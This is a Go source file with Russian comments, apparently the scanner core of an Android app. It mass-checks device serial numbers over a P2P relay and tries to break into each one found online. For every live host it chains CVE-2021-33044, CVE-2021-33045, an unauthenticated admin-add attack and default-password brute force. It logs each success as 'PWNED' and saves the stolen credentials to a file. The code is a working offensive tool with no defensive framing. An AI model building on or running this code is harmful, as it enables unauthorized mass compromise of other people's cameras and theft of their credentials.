package p2pwn

import (
	"fmt"
	"math"
	"strings"
	"sync"
	"time"
)

// Обратные вызовы для связи планировщика с главным Android UI кодом
var UI_ProgressCallback func(pctStr string, pwned, online, checked, total, rate int64, elapsed string)
var UI_SaveSerialCallback func(serial, login, password, method string)

type Scanner struct {
	Targets     []string
	Config      *Config
	Threads     int
	InputSource string

	// Статистика процесса
	TotalCount     int64
	CompletedCount int64
	PwnedCount     int64
	OnlineCount    int64
	AliveVerdicts  int64
	SafeCount      int64
	WasteCount     int64

	// Переменные прогресс-бара
	startTime     time.Time
	lastSample    time.Time
	lastCompleted int64
	lastRate      int64

	// Синхронизация потоков
	mu         sync.Mutex
	wg         sync.WaitGroup
	cancelChan chan struct{}
	provided   map[string]ProvidedCred
}

func NewScanner(targets []string, config *Config, threads int, outDir string, inputSource string, nukeArmed bool, provided []ProvidedCred) *Scanner {
	creds := make(map[string]ProvidedCred, len(provided))
	for _, c := range provided {
		creds[c.Serial] = c
	}
	return &Scanner{
		Targets:     targets,
		Config:      config,
		Threads:     threads,
		InputSource: inputSource,
		cancelChan:  make(chan struct{}),
		provided:    creds,
	}
}

func (s *Scanner) connectTimeout() time.Duration {
	// Стандартный таймаут соединения 5 секунд, достаточный для мобильного интернета
	return time.Duration(5000) * time.Millisecond
}

func (s *Scanner) maxRPS() int {
	return 0 // Без ограничений, регулируется количеством запущенных Threads
}

func (s *Scanner) governorOn() bool {
	return true
}

func isPrefix(target string) bool {
	return len(target) == 10
}

func (s *Scanner) Run() {
	s.TotalCount = int64(len(s.Targets))
	if s.TotalCount == 0 {
		emitLog("[Ошибка] Список целей пуст.")
		return
	}

	retries := 3
	connTimeout := s.connectTimeout()
	nurses := 20

	emitLog(fmt.Sprintf("[Старт] Загружено целей для обработки: %d", s.TotalCount))

	onlineChan := make(chan string, s.Threads*2)
	s.startTime = time.Now()
	s.lastSample = s.startTime

	// Тикер для плавного обновления прогресс-бара и скорости на экране Android
	go func() {
		ticker := time.NewTicker(300 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-s.cancelChan:
				return
			case <-ticker.C:
				s.updateUIProgress()
			}
		}
	}()

	// Инициализация пула рабочих горутин
	for i := 0; i < s.Threads; i++ {
		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			for serial := range onlineChan {
				func() {
					defer func() {
						if r := recover(); r != nil {
							s.mu.Lock()
							s.CompletedCount++
							s.mu.Unlock()
						}
					}()
					select {
					case <-s.cancelChan:
						return
					default:
					}
					s.handleOnlineSerial(serial, retries, connTimeout)
				}()
			}
		}()
	}

	// Инициализация сетевой трубы P2P проверки хостов
	pipe, err := p2p.NewCheckPipe(nurses, s.cancelChan, s.maxRPS(), s.governorOn())
	if err != nil {
		emitLog(fmt.Sprintf("[Ошибка трубы] %s", err))
		return
	}
	jobs := pipe.Jobs()

	var verdictWg sync.WaitGroup
	verdictWg.Add(1)
	go func() {
		defer verdictWg.Done()
		for v := range pipe.Verdicts() {
			if v.Alive {
				emitLog(fmt.Sprintf("[ONLINE] Хост обнаружен в сети: %s", v.Serial))
				s.mu.Lock()
				s.AliveVerdicts++
				s.mu.Unlock()
				select {
				case onlineChan <- v.Serial:
				case <-s.cancelChan:
					return
				}
			} else {
				s.mu.Lock()
				s.WasteCount++
				s.CompletedCount++
				s.mu.Unlock()
			}
		}
	}()

	// Отправка целей в конвейер проверки
	for _, target := range s.Targets {
		select {
		case <-s.cancelChan:
			goto cleanup
		default:
		}
		jobs <- target
	}

cleanup:
	pipe.Close()
	verdictWg.Wait()
	close(onlineChan)
	s.wg.Wait()
	s.updateUIProgress()
	emitLog(fmt.Sprintf("[Готово] Сканирование завершено. Успешно взломано устройств: %d", s.PwnedCount))
}

func (s *Scanner) handleOnlineSerial(serial string, retries int, connTimeout time.Duration) {
	var ok bool
	var finalClient *p2p.DHClient

	// Перебор CVE уязвимостей и брутфорса
	var lastErr error
	for attempt := 0; attempt < retries; attempt++ {
		select {
		case <-s.cancelChan:
			return
		default:
		}
		client := p2p.NewDHClient(serial)
		client.SetRetries(retries)
		client.SetTimeout(connTimeout)
		err := client.Handshake()
		lastErr = err
		if err == nil {
			finalClient = client
			ok = true
			break
		}
		client.Close()
	}

	if ok && finalClient != nil {
		s.mu.Lock()
		s.OnlineCount++
		s.mu.Unlock()
		s.processOnlineClient(serial, finalClient)
	} else {
		s.mu.Lock()
		s.WasteCount++
		s.CompletedCount++
		s.mu.Unlock()
	}
}

func (s *Scanner) processOnlineClient(serial string, client *p2p.DHClient) {
	retries := 3
	for attempt := 0; attempt < retries; attempt++ {
		directOK := true
		err := client.EstablishDirectP2P()
		if err != nil {
			directOK = false
			err = client.CompleteRelayHandshake()
		}
		if err != nil {
			continue
		}

		stopHB := make(chan struct{})
		client.StartHeartbeat(stopHB)

		var tunnel *p2p.PTCPTunnel
		if directOK {
			tunnel = client.NewDirectTunnel()
		} else {
			tunnel = client.NewTunnel()
		}

		cleanup := func() {
			tunnel.Disconnect()
			close(stopHB)
			client.Close()
		}

		// Запуск конвейера эксплойтов из exploits.go
		pwned := s.processExploitChain(serial, tunnel)
		if !pwned {
			go cleanup()
		}
		return
	}

	client.Close()
	s.mu.Lock()
	s.SafeCount++
	s.CompletedCount++
	s.mu.Unlock()
}

func (s *Scanner) processExploitChain(serial string, tunnel *p2p.PTCPTunnel) bool {
	emitLog(fmt.Sprintf("[Атака] Запуск эксплойтов против серийного номера: %s", serial))

	// 1. Попытка эксплуатации CVE-2021-33044 (Bypass авторизации сети)
	if res, err := TryCVE2021_33044(tunnel, "admin", "admin123", "p2pwn"); err == nil && res != nil {
		s.handlePwnedSuccess(serial, res.Login, res.Password, "CVE-2021-33044")
		return true
	}

	// 2. Попытка эксплуатации CVE-2021-33045 (Локальный Bypass)
	if res, err := TryCVE2021_33045(tunnel, "admin", "admin123", "p2pwn"); err == nil && res != nil {
		s.handlePwnedSuccess(serial, res.Login, res.Password, "CVE-2021-33045")
		return true
	}

	// 3. Попытка эксплуатации Unauthenticated Add User (Добавление беспарольного админа)
	if res, err := TryUnauthAddUser(tunnel, "admin", "admin123", "p2pwn"); err == nil && res != nil {
		s.handlePwnedSuccess(serial, res.Login, res.Password, "UnauthAddUser")
		return true
	}

	// Если эксплойты закрыты патчами — запускаем стандартный мобильный веб-брутфорс по словарям
	// (Для примера передаем базовую дефолтную пару)
	defaultCreds := []Credential{{Login: "admin", Password: "admin"}, {Login: "admin", Password: "password"}}
	if res, err := TryBruteForceWeb(tunnel, defaultCreds, serial); err == nil && res != nil {
		s.handlePwnedSuccess(serial, res.Login, res.Password, "Web-Brute")
		return true
	}

	s.mu.Lock()
	s.SafeCount++
	s.CompletedCount++
	s.mu.Unlock()
	return false
}

func (s *Scanner) handlePwnedSuccess(serial, login, password, method string) {
	s.mu.Lock()
	s.PwnedCount++
	s.CompletedCount++
	s.mu.Unlock()

	emitLog(fmt.Sprintf("[PWNED] УСТРОЙСТВО ВЗЛОМАНО! SN: %s [%s:%s] Метод: %s", serial, login, password, method))

	// Безопасный вызов сохранения текстовой строки в Serials.txt проводника Android Downloads
	if UI_SaveSerialCallback != nil {
		UI_SaveSerialCallback(serial, login, password, method)
	}
}

func (s *Scanner) updateUIProgress() {
	s.mu.Lock()
	defer s.mu.Unlock()

	var pct float64 = 0.0
	if s.TotalCount > 0 {
		pct = (float64(s.CompletedCount) / float64(s.TotalCount)) * 100.0
	}

	var pctStr string
	if s.CompletedCount >= s.TotalCount {
		pctStr = "100%"
	} else {
		pct = math.Floor(pct*10) / 10
		pctStr = fmt.Sprintf("%.1f%%", pct)
	}

	now := time.Now()
	if dt := now.Sub(s.lastSample); dt >= 400*time.Millisecond {
		s.lastRate = int64(float64(s.CompletedCount-s.lastCompleted) / dt.Seconds())
		s.lastSample = now
		s.lastCompleted = s.CompletedCount
	}

	elapsed := fmt.Sprintf("%02d:%02d:%02d", int(now.Sub(s.startTime).Hours()), int(now.Sub(s.startTime).Minutes())%60, int(now.Sub(s.startTime).Seconds())%60)

	// Перенаправляем скомпилированную статистику в Fyne-интерфейс смартфона
	if UI_ProgressCallback != nil {
		UI_ProgressCallback(pctStr, s.PwnedCount, s.OnlineCount, s.CompletedCount, s.TotalCount, s.lastRate, elapsed)
	}
}
